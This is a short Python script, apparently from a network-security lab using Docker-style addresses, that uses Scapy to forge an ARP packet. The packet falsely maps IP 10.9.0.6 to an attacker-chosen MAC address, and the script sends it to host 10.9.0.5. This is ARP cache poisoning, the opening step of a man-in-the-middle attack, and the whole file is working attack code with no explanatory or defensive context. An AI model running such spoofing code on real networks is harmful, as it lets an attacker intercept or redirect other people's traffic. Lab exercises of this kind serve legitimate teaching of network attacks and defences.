#!/usr/bin/python3
from scapy.all import *

ETHER = Ether()
ARP_VAR = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6',hwdst='02:42:0a:09:00:05',
          pdst='10.9.0.5')

pkt = ETHER/ARP_VAR
pkt.show()

sendp(pkt)
